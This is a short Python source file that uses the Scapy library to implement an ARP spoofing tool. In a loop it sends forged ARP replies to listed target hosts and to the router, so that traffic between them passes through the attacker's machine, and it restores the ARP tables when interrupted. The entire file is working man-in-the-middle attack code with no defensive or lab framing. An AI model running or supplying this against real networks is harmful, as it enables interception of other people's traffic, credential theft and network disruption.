from scapy.all import *
import time
from itertools import cycle


class ArpSpoof:
    def __init__(self):
        pass

    @staticmethod
    def spoof(target_ip, spoof_ip):
        target_mac = getmacbyip(target_ip)
        packet = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
        send(packet, verbose=False)

    @staticmethod
    def restore(source_ip, destination_ip):
        source_mac = getmacbyip(source_ip)
        destination_mac = getmacbyip(destination_ip)
        packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=destination_ip, hwdst=destination_mac)
        send(packet, count=5, verbose=False)

    def run(self, target_ip, router_ip):
        cycle_target_ip = cycle(target_ip)
        try:
            while True:
                for ip in cycle_target_ip:
                    self.spoof(ip, router_ip)
                    self.spoof(router_ip, ip)
                    time.sleep(1)
        except KeyboardInterrupt:
            print("\n[-] CTRL+C detected. Resetting the ARP tables")
            for ip in target_ip:
                self.restore(ip, router_ip)
                self.restore(router_ip, ip)
